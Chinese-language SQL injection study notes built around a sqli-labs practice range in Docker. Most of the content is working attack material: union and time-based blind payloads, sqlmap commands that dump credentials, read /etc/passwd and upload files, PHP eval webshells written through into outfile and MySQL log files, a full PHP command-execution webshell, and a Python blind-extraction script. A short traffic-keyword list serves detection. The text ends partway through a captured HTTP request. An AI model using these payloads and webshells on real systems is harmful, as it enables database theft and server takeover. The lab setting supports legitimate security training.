## 搭建sqlilabs靶场

### docker搭建sqlilabs靶场

```bash
docker search sqli-labs
docker pull acgpiano/sqli-labs
docker run -dt --name sqli-labs -p 8088:80 --restart=always acgpiano/sqli-labs #开机自启

docker update --restart=no sqli-labs 		#取消容器开机自启
docker update --restart=always sqli-labs #启动开机自启
docker start sqli-labs #启动
```

![image-20240801161136631](../../../../repo/assets/19.SQL注入/image-20240801161136631.png)

#### 进入虚拟终端

```bash
docker exec -it sqli-labs /bin/bash
cat /etc/mysql/my.cnf
ls /var/www/html/
cat /var/www/html/sql-connections/db-creds.inc


mysql -u root
show databases;
use security;
show tables;
desc users;
select * from users;
```

![image-20240801162726842](../../../../repo/assets/19.SQL注入/image-20240801162726842.png)

![image-20240801163850647](../../../../repo/assets/19.SQL注入/image-20240801163850647.png)

![image-20240801162945726](../../../../repo/assets/19.SQL注入/image-20240801162945726.png)



#### 访问

http://192.168.70.14:8088

![image-20240801161214413](../../../../repo/assets/19.SQL注入/image-20240801161214413.png)

#### 重置靶场

![image-20240801161047108](../../../../repo/assets/19.SQL注入/image-20240801161047108.png)

### sqlmap

```bash
sqlmap -u http://192.168.70.14:8088/Less-1/?id=1 --batch --dbs
sqlmap -u http://192.168.70.14:8088/Less-1/?id=1 --batch -D security --tables
sqlmap -u http://192.168.70.14:8088/Less-1/?id=1 --batch -D security -T users --column
sqlmap -u http://192.168.70.14:8088/Less-1/?id=1 --batch -D security -T users -C id,username,password --dump
```

![image-20240801170629854](../../../../repo/assets/19.SQL注入/image-20240801170629854.png)

![image-20240801170702240](../../../../repo/assets/19.SQL注入/image-20240801170702240.png)

![image-20240803112700602](../../../../repo/assets/19.SQL注入/image-20240803112700602.png)

![image-20240803112758011](../../../../repo/assets/19.SQL注入/image-20240803112758011.png)

## sql注入基础知识

### **SQL注入攻击的根源**

程序命令和用户数据（即用户输入）之间没有做到泾渭分明

#### 注入成功的基础

1. 1、相信用户输入的数据
2. 2、Sql语句的拼接

### **注入之前必须要做三件事情**

- 确定web应用程序所使用的技术
- 确定所有可能的输入方式
- 查找可以用于注入的用户输入

### **万能密码原理解析**

-  大家经常听到网站万能密码登录，
-  输入 `' or 1=1 --` 发现输入任何密码都可以登录成功

### **注入前的准备及注入漏洞检测**

-  捕捉报错信息
-  手工检测SQL注入点

 最常用的SQL注入点判断方法，是在网站中寻找如下形式的网页连接。

> - http:// www.*****. com/ ***.asp?id=x (ASP注入)
> - http:// www.*****. com/ ***.php?id=x (php注入).
> - http:// www.*****. com/ ***.jsp?id=x (jsp注入)
> - http:// www.*****. com/ ***.aspx?id=x (aspx注入)
> - http:// www.*****.com/index/new/id/8 伪静态。
> - http:// www.*****.com/index/new/php-8.html 伪静态

#### 最后修改时间

```
javascript:alert(document.lastModified)
```



### **注入前的准备及注入漏洞检测**

####  检测方法

1.  1.“**单引号**”法
2.  2.`and 1=1`和`1=2`法
3.  3.通过页面返回的**报错信息**,一般情况下页面报错会显示是什么数据库类型

### **SQL注入的分类**

####  **按照注入的网页功能类型分类**

1.  1、登录注入
2.  2、cms注入

####  **按照注入点值的属性分类**

1.  1、数值型
2.  2、字符串型

####  **基于从服务器返回的内容**

1.  1、有回显
2.  2、无回显

####  **按照注入的程度和顺序**

1.  1、一阶注入
2.  2、二阶注入

####  **其他业务场景**

-  Update注入
-  Insert注入
-  Delete注入
-  Like注入
-  Order by注入
-  宽字节注入
-  http头注入

### **Mysql注入知识复习**

#### information_schema

在`Mysql 5.0`以上的版本中，为了方便管理，默认定义了`information_schema`数据库，用来存储数据库元信息。

其中具有表`schemata`(数据库名)、`tables`(表名)、`columns`(列名或字段名)。

![image-20240802091506404](../../../../repo/assets/19.SQL注入/image-20240802091506404.png)

#### 命令

- • `user()`:查看当前Mysql登录用户名
- • `database():`查看当前使用Mysql数据库名
- • `version()`:查看当前Mysql版本
- • `@@version`
- • `@@basedir`
- • `length()` 字符串长度
- • `substring()`截取字符串
- • `ord` 返回ASCII码值
- • `concat` 连接字符串
- • `sleep(4)` 睡眠指定描述
- • `group_concat()` 查询结果放同一行
- • `limit m,n` 从m行开始，到m+n行。
- • `mid()`需要截取的字符串

#### 注释

- • `#`
- • `--空格`（%20）
- • `/**/`
- • **内联注释**:`/*!SQL语句*/`只有Mysql可以识别，常用来绕过WAF

例如:

```
select * from articles where id = id
```

• 使用内联注释注入:

```
select *from articles where id =-1 /*!union*//*!select*/
```

## GET 基于报错的 SQL 注入回显分析

通过在 URL 中修改对应的 `ID` 值，为**正常数字**、**大数字**、**字符**（**单引号**、**双引号**、**括号**）、**反斜杠**`/`来探测 URL 中是否存在注入点。

实验:`Sqli-Lab Less1~4`,GET 基于报错的 SQL 注入。

### **Less1 –基于字符串**

输入`?id=1'`

报错信息是

```
'1'' LIMIT 0,1 
```

推断 sql 语句是

```mysql
select login_name,password from admin where id =' id' ' limit 0,1
select login_name,password from admin where id =' ** ' limit 0,1
```



### **less2 -基于数字**

输入 `?id=1'`

报错信息是

```
' LIMIT 0,1 
```

推断 sql 语句是

```mysql
select login_name,password from admin where id = ** limit 0,1
```



### **less3 基于括号**

输入 `?id=1'`

报错信息是

```
'1'') LIMIT 0,1 
```

推断 sql 语句是

```
select login_name,password from admin where id =('id') limit 0,1
```

验证 http://192.168.70.14:8088

能够出现正确结果 或者使用`--%20`

### **Less4 基于双引号报错**

输入 `?id=1"`或者 `id=1\`

报错消息是：

```
"14"") LIMIT 0,1 ' 
```

推断 sql 语句是

```
select login_name,password from admin where id =("id") limit 0,1
```

## **GET 基于报错的 SQL 注入利用及流量分析**

### **1、** **利用 order by 判断字段数。**

```
http://192.168.70.14:8088/Less-1/?id=1' order by 3 --+
http://192.168.70.14:8088/Less-1/?id=1' order by 4 --+
```

![image-20240802211019630](../../../../repo/assets/19.SQL注入/image-20240802211019630.png)

![image-20240802211104090](../../../../repo/assets/19.SQL注入/image-20240802211104090.png)

### **2、** **利用 union select 联合查询，获取库名和表名。**

#### 查询显示位

```
http://192.168.70.14:8088/Less-1/?id=0' UNION SELECT 1,2,3 --+
```

![image-20240802211125642](../../../../repo/assets/19.SQL注入/image-20240802211125642.png)

查询 2，3 字段

#### 获得用户和数据库名

```
http://192.168.70.14:8088/Less-1/?id=0' UNION SELECT 1,user(),database() --+
```

![image-20240802211206685](../../../../repo/assets/19.SQL注入/image-20240802211206685.png)

#### 看 version 版本

```
http://192.168.70.14:8088/Less-1/?id=0' UNION SELECT 1,version(),database() --+
```

![image-20240802211432008](../../../../repo/assets/19.SQL注入/image-20240802211432008.png)

#### 具体开始探测

```
http://192.168.70.14:8088/Less-1/?id=0' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+
```

![image-20240802211608731](../../../../repo/assets/19.SQL注入/image-20240802211608731.png)

### **3、** **利用 union select 联合查询，获取字段名。**

```
http://192.168.70.14:8088/Less-1/?id=0' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users' --+
```

![image-20240802211702988](../../../../repo/assets/19.SQL注入/image-20240802211702988.png)

### **4、** **利用 union select 联合查询，获取字段值**

```
http://192.168.70.14:8088/Less-1/?id=0' union select 1,group_concat(username,0x3a,password),3 from users --+
```

![image-20240802211733747](../../../../repo/assets/19.SQL注入/image-20240802211733747.png)

### **5、** **select into outfile 写一句话木马**

#### 写一句话木马

```bash
http://192.168.70.14:8088/Less-4/?id=-1") union select 1,"<?php eval($_POST['xxx']);?>",3 into outfile '/var/www/html/shell.php' --+
```

![image-20240802170158938](../../../../repo/assets/19.SQL注入/image-20240802170158938.png)

#### 配置

```bash
mysql> show variables like 'secure_file_priv';
chmod 777 /var/www/html
```

![image-20240802212255609](../../../../repo/assets/19.SQL注入/image-20240802212255609.png)

#### 蚁剑链接

![image-20240802170352310](../../../../repo/assets/19.SQL注入/image-20240802170352310.png)

![image-20240802170443917](../../../../repo/assets/19.SQL注入/image-20240802170443917.png)

#### 分析蚁剑流量

蚁剑流量特征

antsword

- @ini _set("display","0");
- @set time limit(0)
- base64编码

### 5.1、慢日志写入一句话木马

##### windows mysql设置

```bash
[mysqld]

slow_query_log=1 # 启动慢查询日志
```

##### 获取数据库用户名密码

```bash
?id=0' union select 1,group_concat(user,0x3a,authentication_string),3 from mysql.user--+
```

![image-20240802172357081](../../../../repo/assets/19.SQL注入/image-20240802172357081.png)

##### 查看慢日志状态和路径

```bash
show variables like '%slow_query_log%';
```

![image-20240803100922532](../../../../repo/assets/19.SQL注入/image-20240803100922532.png)

##### 启动慢日志

```bash
set global slow_query_log=1;
set global slow_query_log_file='/var/www/html/shell.php';

show variables like '%char%';						#查看字符集路径
show variables like '%slow_query_log%';
show variables like '%log%';
```

![image-20240803101406917](../../../../repo/assets/19.SQL注入/image-20240803101406917.png)

![image-20240803101733059](../../../../repo/assets/19.SQL注入/image-20240803101733059.png)

##### 查看默认时间

```bash
show variables like '%long_query_time%';
```

![](../../../../repo/assets/19.SQL注入/image-20240803102822112.png)

##### 写一句话木马

```bash
select '<?php @eval($_POST["xxx"]);?>' or sleep(10);
```

![image-20240803103106313](../../../../repo/assets/19.SQL注入/image-20240803103106313.png)

![image-20240803103526942](../../../../repo/assets/19.SQL注入/image-20240803103526942.png)

##### 蚁剑连接

```bash
http://192.168.70.14:8088/shell.php
xxx
```

![image-20240803103624862](../../../../repo/assets/19.SQL注入/image-20240803103624862.png)

![image-20240803103756911](../../../../repo/assets/19.SQL注入/image-20240803103756911.png)

### 5.2、一般日志

一般查询日志 记录所有客户端发给数据库服务器的SQL语句 增删改查.....

`general log`

```bash
show variables like '%general_log%';

set global general_log=1;
set global general_log_file='/var/www/html/shell1.php';

select '<?php @eval($_POST["xxx"]);?>';

chmod o+rw /var/www/html/shell1.php
```

#### 查询一般日志的状态

![image-20240803105252493](../../../../repo/assets/19.SQL注入/image-20240803105252493.png)

#### 开启一般日志，写入webshell

![image-20240803113846495](../../../../repo/assets/19.SQL注入/image-20240803113846495.png)

![image-20240803113913079](../../../../repo/assets/19.SQL注入/image-20240803113913079.png)

#### 赋予其他人查看权限

![image-20240803141527679](../../../../repo/assets/19.SQL注入/image-20240803141527679.png)

#### 蚁剑连接

```bash
http://192.168.70.14:8088/shell1.php
xxx
```

![image-20240803141704959](../../../../repo/assets/19.SQL注入/image-20240803141704959.png)

![image-20240803141742229](../../../../repo/assets/19.SQL注入/image-20240803141742229.png)

### **6、** **利用 load_file 读敏感文件**

```
http://192.168.70.14:8088/Less-1/?id=-1' union select 1,2,load_file('/etc/passwd') --+
```

![image-20240802212549223](../../../../repo/assets/19.SQL注入/image-20240802212549223.png)

### **7、** **流量分析**

#### 流量敏感关键字：

- `union`
- `select`
- `group_concat`
- `into outfile`
- `load_file()`

#### 木马流量敏感关键字

```
<?php @eval($_POST["xxx"]); ?>
```

#### 相应 webshell 管理工具流量

比如菜刀流量、冰歇流量、蚁剑流量、哥斯拉的流量

## **利用 sqlmap 探测 get 类型注入**

### **1、探测数据库名**

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --dbs 
```

![image-20240801170629854](../../../../repo/assets/19.SQL注入/image-20240801170629854.png)

### **2、探测表名**

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch -D security --tables 
```

![image-20240801170702240](../../../../repo/assets/19.SQL注入/image-20240801170702240.png)

### **3、探测字段名**

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch -D security -T users --columns 
```

![image-20240803112700602](../../../../repo/assets/19.SQL注入/image-20240803112700602.png)

### **4、探测 字段值**

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch -D security -T users -C id,username,password --dump 
```

![image-20240803112758011](../../../../repo/assets/19.SQL注入/image-20240803112758011.png)

### **5、读取敏感文件**

> --file-read

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --file-read '/etc/passwd' 
cat /root/.local/share/sqlmap/output/192.168.70.14/files/_etc_passwd
```

![image-20240803113005155](../../../../repo/assets/19.SQL注入/image-20240803113005155.png)

![image-20240803113103126](../../../../repo/assets/19.SQL注入/image-20240803113103126.png)

### **6、上传一句话木马**

> --file-write
>
> --file-dest

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --file-write '/root/tools/webshell/xxx.php' --file-dest '/var/www/html/ma.php' 
```

![image-20240803144143433](../../../../repo/assets/19.SQL注入/image-20240803144143433.png)

#### 蚁剑连接

```
http://192.168.70.14:8088/ma.php
xxx
```

![image-20240803144320050](../../../../repo/assets/19.SQL注入/image-20240803144320050.png)

![image-20240803144346544](../../../../repo/assets/19.SQL注入/image-20240803144346544.png)

### sqlmap代理

> --purge	 #清空缓存
>
> --proxy http://127.0.0.1:8080     #代理

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --dbs --purge --proxy 127.0.0.1:8080
```

![image-20240803150017232](../../../../repo/assets/19.SQL注入/image-20240803150017232.png)

#### burp抓包

![image-20240803150100455](../../../../repo/assets/19.SQL注入/image-20240803150100455.png)

![image-20240803150343338](../../../../repo/assets/19.SQL注入/image-20240803150343338.png)

### 指定插件 --technique

> `BEUSTQ`
>
> 1. `B` - Boolean-based blind SQL injection（**布尔型盲注**）
> 2. `E` - Error-based SQL injection（**报错型注入**）
> 3. `U` - UNION query SQL injection（**联合查询注入**）
> 4. `S` - Stacked queries SQL injection（**堆叠注入**）
> 5. `T` - Time-based blind SQL injection（**基于时间的盲注**）
> 6. `Q` - Inline queries SQL injection（**内联查询注入**）

> --technique T 	#时间盲注
>
> --technique B        #布尔盲注

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --technique T --dbs 
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --technique B --dbs 
```



### 交互式shell

> --os-shell
>
> --os-cmd=whoami

```bash
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --os-shell 
sqlmap -u "http://192.168.70.14:8088/Less-1/?id=1" --batch --os-cmd=whaomi

4
2
/var/www/html
```

![image-20240803094110561](../../../../repo/assets/19.SQL注入/image-20240803094110561.png)

![image-20240803094300485](../../../../repo/assets/19.SQL注入/image-20240803094300485.png)

![image-20240803094517464](../../../../repo/assets/19.SQL注入/image-20240803094517464.png)

```php
<?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set("max_execution_time",0);$z=@ini_get("disable_functions");if(!empty($z)){$z=preg_replace("/[, ]+/",',',$z);$z=explode(',',$z);$z=array_map("trim",$z);}else{$z=array();}$c=$c." 2>&1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f("system")){ob_start();system($c);$w=ob_get_clean();}elseif(f("proc_open")){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f("shell_exec")){$w=shell_exec($c);}elseif(f("passthru")){ob_start();passthru($c);$w=ob_get_clean();}elseif(f("popen")){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f("exec")){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}echo"<pre>$w</pre>";?>
```



> 上传码：http://192.168.70.14:8088/tmpukkuq.php
>
> webshell：http://192.168.70.14:8088/tmpbhkcj.php
>
> 连接密码：cmd

![image-20240803094323468](../../../../repo/assets/19.SQL注入/image-20240803094323468.png)

![image-20240803094340477](../../../../repo/assets/19.SQL注入/image-20240803094340477.png)

![image-20240803094828413](../../../../repo/assets/19.SQL注入/image-20240803094828413.png)

## **post 基于错误的注入及**流量分析

### **1**、post **基于错误单引号注入回显分析**

注入点位置发生了变化，在浏览器中已经无法直接进行查看与修改。当然可以借助对应的插件可以完成修改任务。以 `Sqli-Lab Less11` 为例。

用 burpsuite 抓 `Less11` 的包，发送 repeate 修改

```mysql
Select username,password from db where username='admin' and password='123456'
```

但是如果我们加上`\`

```mysql
Select username,password from db where username='admin\' and password='123456'
```

因为\’被认为是转义字符，所以，红色部分是一个字符串，所以 123456 部分出错

漏洞利用

闭合 123456 的单引号`'`，然后加入万能密码，然后注释 发现登录成功

```bash
uname=admin&passwd=123456' or 1=1 --+ submit=Submit
```

#### 1、查找闭合方式

```
http://192.168.70.14:8088/Less-11/

passwd=1&submit=Submit&uname=admin'#
```

单引号`'`闭合

![image-20240803201636994](../../../../repo/assets/19.SQL注入/image-20240803201636994.png)

#### 2、判断列数

```
passwd=1&submit=Submit&uname=admin' order by 2#
passwd=1&submit=Submit&uname=admin' order by 3#
```

![image-20240803201726666](../../../../repo/assets/19.SQL注入/image-20240803201726666.png)

![image-20240803201748168](../../../../repo/assets/19.SQL注入/image-20240803201748168.png)

有`2`列字段，3列就报错了

#### 3、查看显示位

```
passwd=1&submit=Submit&uname=0' union select 1,2#
```

![image-20240803201952965](../../../../repo/assets/19.SQL注入/image-20240803201952965.png)

`1`和`2`都是显示位

#### 4、获取数据库名

```
passwd=1&submit=Submit&uname=0' union select version(),database()#
```

![image-20240803202246544](../../../../repo/assets/19.SQL注入/image-20240803202246544.png)

#### 5、获取表名

```
passwd=1&submit=Submit&uname=0' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#
```

![image-20240803202320057](../../../../repo/assets/19.SQL注入/image-20240803202320057.png)

#### 6、获取字段名

```
passwd=1&submit=Submit&uname=0' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()#
```

![image-20240803202355435](../../../../repo/assets/19.SQL注入/image-20240803202355435.png)

#### 7、获取字段值

```
passwd=1&submit=Submit&uname=0' union select 1,group_concat(username,0x3a,password) from security.users#
```

![image-20240803202422982](../../../../repo/assets/19.SQL注入/image-20240803202422982.png)

### **2**、**post **基于错误的双引号注入回显利用

Bp 抓包修改 发现 sql 语句错误

闭合`")`加上万能密码 `or 1=1` 加上 `--+`，正确登录

### **3**、**Sqlmap** **进行** **post** **注入测试**

#### 注入测试方法

复制 `Burpsuite` 截断的 HTTP 请求数据包到文本文件中，使用 `Sqlmap -r` 文件路径`-p` 指定探测参数。

第一步 bp 抓包 获得 `Less11` 的包，然后将 raw 格式 http 数据赋值到`2.txt` 文本文件中

#### -r

> -r

##### 0、burpsuit抓包Less-11

保存为`2.txt`,给`passwd`侯标记`*`

```bash
POST /Less-11/ HTTP/1.1
Host: 192.168.70.14:8088
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 39
Origin: http://192.168.70.14:8088
Connection: close
Referer: http://192.168.70.14:8088/Less-11/
Upgrade-Insecure-Requests: 1

uname=admin&passwd=admiin&submit=Submit
```

![image-20240803203312388](../../../../repo/assets/19.SQL注入/image-20240803203312388.png)

![image-20240803203616594](../../../../repo/assets/19.SQL注入/image-20240803203616594.png)

![image-20240803203647949](../../../../repo/assets/19.SQL注入/image-20240803203647949.png)

##### **1、探测数据库名**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch -dbs
```

![image-20240803204804463](../../../../repo/assets/19.SQL注入/image-20240803204804463.png)

##### **2、探测表名**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch -D security --tables 
```

![image-20240803204823003](../../../../repo/assets/19.SQL注入/image-20240803204823003.png)

##### **3、探测字段名**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch -D security -T users --columns 
```

![image-20240803204845023](../../../../repo/assets/19.SQL注入/image-20240803204845023.png)

##### **4、探测字段值**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch -D security -T users -C id,username,password --dump 
```

![image-20240803204903319](../../../../repo/assets/19.SQL注入/image-20240803204903319.png)

##### **5、读取敏感文件**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch --file-read '/etc/passwd' 
cat /root/.local/share/sqlmap/output/192.168.70.14/files/_etc_passwd
```

![image-20240803204944668](../../../../repo/assets/19.SQL注入/image-20240803204944668.png)

##### **6、上传一句话木马**

```bash
sqlmap -r /root/tools/sqlmap/2.txt --batch --file-write '/root/tools/webshell/xxx.php' --file-dest '/var/www/html/muma.php' 
```

![image-20240803205134173](../../../../repo/assets/19.SQL注入/image-20240803205134173.png)

![image-20240803205159224](../../../../repo/assets/19.SQL注入/image-20240803205159224.png)

###### 蚁剑连接

```
192.168.70.14:8088/muma.php
xxx
```

![image-20240803205352457](../../../../repo/assets/19.SQL注入/image-20240803205352457.png)

![image-20240803205512255](../../../../repo/assets/19.SQL注入/image-20240803205512255.png)

#### --data

> --data

```bash
sqlmap -u "http://192.168.70.14:8088/Less-12/" --batch --data "uname=admin&passwd=123456*&submit=Submit" --purge --dbs 
```

![image-20240803162156315](../../../../repo/assets/19.SQL注入/image-20240803162156315.png)

### 4、流量特征分析

请求体位置含有注入语句

#### 流量敏感关键字

- order by
- union
- select
- group_concat
- into outfile
- load_file()

## **基于时间的盲注及流量分析**

### **1.Sql 注入盲注基础**

`Blind SQL`(**盲注**)是注入攻击的其中一种,向数据库发送 true 或 false 这样的问题,并根据应用程序返回的信息判断结果.这种攻击的出现是因为应用程序配置为只显示常规错误,但并没有解决 SQL 注入存在的代码问题。

演示盲注问题。当攻击者利用 SQL 注入漏洞进行攻击时,有时候 web 应用程序会显示,后端数据库执行 SQL 查询返回的错误信息. `Blind SQL` (盲注)与常规注入很接近,不同的是数据库返回数据的检索方式.若数据库没有输出数据到web 页面,攻击者会询问一些列的 true 或 false 问题,强制从数据库获取数据。

盲注可以分为基于**布尔的盲注**和基于**时间的盲注**

### **2.基于时间的盲注原理及展示**

**延时注入**，用的最多的注入

#### 常用的判断语句

```
' and if(1=0,1, sleep(10)) --+
" and if(1=0,1, sleep(10)) --+
) and if(1=0,1, sleep(10)) --+
') and if(1=0,1, sleep(10)) --+
") and if(1=0,1, sleep(10)) --+
```

> 利用 if(条件,0,1)函数，当条件为真，返回 1，假则返回 sleep（10）

#### ASCII码

![ASSII码.jpg](../../../../repo/assets/19.SQL注入/f82a34af7f0f98c212181fda9737d14e.jpg)

#### Sqli-lab 9-10 实验 基于时间的盲注

```bash
http:192.168.70.14:8088/Less-9/?id=1' and if(1=1,sleep(6),1) --+
```

在这里是`' and 1=1` 为真，延时 `6` 秒，假则直接返回（注入点和注入语句基本确定可使用）

##### Less-9 执行范例：

###### 数据库名

数据库名第一个字母

```bash
http:192.168.70.14:8088/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(10),1) --+
```

当数据库名第一个字母的 `ascii` 码等于 `115` 时，执行 `sleep(10)`函数等待 10 秒。

###### 表名长度

```
http:192.168.70.14:8088/Less-9/?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))>1,sleep(5),0)--+
```



### **3.get 基于时间的盲注应用**

#### Less-9 时间盲注

##### 判断数据库长度

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if(length(database())=8,sleep(5),0)--+
```

![image-20240805194210805](../../../../repo/assets/19.SQL注入/image-20240805194210805.png)

##### 判断数据库名

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if(substr(database(),1,1)='s',sleep(5),0)--+
```

![image-20240805194250204](../../../../repo/assets/19.SQL注入/image-20240805194250204.png)

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115,sleep(5),0)--+
```

![image-20240805194319719](../../../../repo/assets/19.SQL注入/image-20240805194319719.png)

##### 判断有几张表

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if((select count(table_name) from information_schema.tables where table_schema=database())=4,sleep(5),0)--+
```

![image-20240805194404301](../../../../repo/assets/19.SQL注入/image-20240805194404301.png)

##### 判断第一个表名长度

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if(length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=6,sleep(5),0)--+ 
```

`emails`

![image-20240805194817141](../../../../repo/assets/19.SQL注入/image-20240805194817141.png)

##### 判断表名

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,sleep(5),0)--+
```

`emails`

![image-20240805194905964](../../../../repo/assets/19.SQL注入/image-20240805194905964.png)

##### 判断列数

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if((select count(column_name) from information_schema.columns where table_name='users' and table_schema=database())=3,sleep(5),0)--+
```

![image-20240805194942858](../../../../repo/assets/19.SQL注入/image-20240805194942858.png)

##### 判断列名

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),1,1))=105,sleep(5),0)--+
```

`id,username,password`

![image-20240805195109460](../../../../repo/assets/19.SQL注入/image-20240805195109460.png)

##### 获取字段值

字段值行数

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if((select count(username) from users)=13,sleep(5),0)--+
```

![image-20240805195142927](../../../../repo/assets/19.SQL注入/image-20240805195142927.png)

字段值

```bash
http://192.168.70.14:8088/Less-9/?id=1' and if(ascii(substr((select username from users limit 0,1),1,1))=68,sleep(5),0)--+
```

`Dumb`

![image-20240805195239742](../../../../repo/assets/19.SQL注入/image-20240805195239742.png)

#### python代码：时间盲注

```python
import requests
import time
import datetime

url = "http://192.168.70.14:8088/Less-9/?id=1'"

def get_dbname():
    dbname = ''
    for i in range(1,9):
        for k in range(32,127):
            payload = "and if(ascii(substr(database(),{0},1))={1},sleep(2),1)--+".format(i,k)
            #if语句里面的sleep(2)为如果注入语句正确就睡眠两秒
            time1 = datetime.datetime.now()
            #获得提交payload之前的时间
            res = requests.get(url + payload)
            time2 = datetime.datetime.now()
            #获得payload提交后的时间
            difference = (time2 - time1).seconds
            #time，time2时间差，seconds是只查看秒
            if difference > 1:
                dbname += chr(k)
            else:
                continue
        print("数据库名为->"+dbname)

def get_table():
    table1 = ''
    table2 = ''
    table3 = ''
    table4 = ''
    for i in range(5):
        for j in range(6):
            for k in range(32,127):
                payload = "and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1))=%d,sleep(2),1)--+"%(i,j,k)
                time1 = datetime.datetime.now()
                res = requests.get(url + payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        table1 += chr(k)
                        print("第一个表为->"+table1)
                    elif i == 1:
                        table2 += chr(k)
                        print("第二个表为->"+table2)
                    elif i == 3:
                        table3 += chr(k)
                        print("第三个表为->"+table3)
                    elif i == 4:
                        table4 += chr(k)
                        print("第四个表为->"+table4)
                    else:
                        break

def get_column():
    column1 = ''
    column2 = ''
    column3 = ''
    for i in range(3):
        for j in range(1,9):
            for k in range(32,127):
                payload = "and if(ascii(substr((select column_name from information_schema.columns where table_name=users and table_schema=database() limit %d,1),%d,1))=%d,sleep(2),1)--+"%(i,j,k)
                time1 = datetime.datetime.now()
                res = requests.get(url+payload)
                time2 = datetime.datetime.now()
                difference = (time2-time1).seconds
                if difference > 1:
                    if i == 0:
                        column1 += chr(k)
                        print("字段一为->"+column1)
                    if i == 1:
                        column2 += chr(k)
                        print("字段二为->"+column2)
                    if i == 2:
                        column3 += chr(k)
                        print("字段三为->"+column3)
                    else:
                        break

def get_users():
    user = ''
    for i in range(188):
        for k in range(32,127):
            payload = "and if(ascii(substr((select group_concat(username) from users),%d,1))=%d,sleep(2),1)--+"%(i,k)
            time1 = datetime.datetime.now()
            res = requests.get(url+payload)
            time2 = datetime.datetime.now()
            difference = (time2-time1).seconds
            if difference > 1:
                user += chr(k)
                print("user为->"+user)

if __name__ == '__main__':
    get_dbname()
    get_table()
    get_column()
    get_users()
```



### **4.post 基于时间的盲注应用**

在存在注入点 post 提交的参数后加入类似 `and if(length(database())>5,sleep(5),null) ` #如果执行的页面响应时间大于 5秒，那么看肯定就存在注入，并且对应的 sql 语句执行

#### Less-15 时间盲注

##### 数据库长度

```
http://192.168.70.14:8088/Less-15/

uname=admin' and if(length(database())>5,sleep(5),null) --+&passwd=admin123456&submit=Submit
```

如果数据据名称大于 5，则等待 5 秒，可以看到，执行时间大于 5 秒，说明数据库名称大于 5

##### 数据库名

```
uname=admin' and if(substr(database(),1,1)='s',sleep(5),0)--+
```

##### 几张表

```
uname=admin' and if((select count(table_name) from information_schema.tables where table_schema=database())=4,sleep(5),0)--+
```

##### 第一个表名长度

```
uname=admin' and if(length((select table_name from information_schema.tables where table_schema='security' limit 0,1))=6,sleep(5),0)--+ 
```

##### 表名

```
uname=admin' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,sleep(5),0)--+
```

##### 字段数

```
uname=admin' and if((select count(column_name) from information_schema.columns where table_name='users' and table_schema=database())=3,sleep(5),0)--+
```

##### 字段名

```
uname=admin' and if(ascii(substr((select column_name from information_schema.columns where table_name='users' and table_schema=database() limit 0,1),1,1))=105,sleep(5),0)--+
```

##### 字段值

```
uname=admin' and if((select count(username) from users)=13,sleep(5),0)--+
```



#### burpsuite抓包

```
POST /Less-15/ HTTP/1.1
Host: 192.168.70.14:8088
Content-Length: 38
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://192.168.70.14:8088
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.70.14:8088/Less-15/
